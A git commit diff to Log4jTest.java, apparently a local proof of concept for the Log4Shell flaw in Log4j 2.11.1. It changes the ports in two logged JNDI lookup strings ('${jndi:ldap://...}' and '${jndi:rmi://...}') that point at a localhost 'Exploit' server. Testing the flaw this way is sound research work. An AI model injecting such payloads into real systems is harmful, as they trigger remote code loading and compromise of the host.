e4fdafc9d14ed00cbac73845384c980e48a25f3e
standard gitter <4243354+standardgitter@users.noreply.github.com>
2021-12-11 03:11:03 +0800

    Update Log4jTest.java

--- log4j2/src/main/java/Log4jTest.java
+++ log4j2/src/main/java/Log4jTest.java
@@ -10,8 +10,8 @@ import org.apache.logging.log4j.Logger;
 public class Log4jTest {
     private static Logger LOG = LogManager.getLogger(Log4jTest.class);
     public static void main(String[] args) throws Exception {
-        LOG.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
-        LOG.error("${jndi:rmi://127.0.0.1:1099/Exploit}");
+        LOG.error("${jndi:ldap://127.0.0.1:11389/Exploit}");
+        LOG.error("${jndi:rmi://127.0.0.1:11099/Exploit}");
         System.out.println("2.11.1");
     }
 }
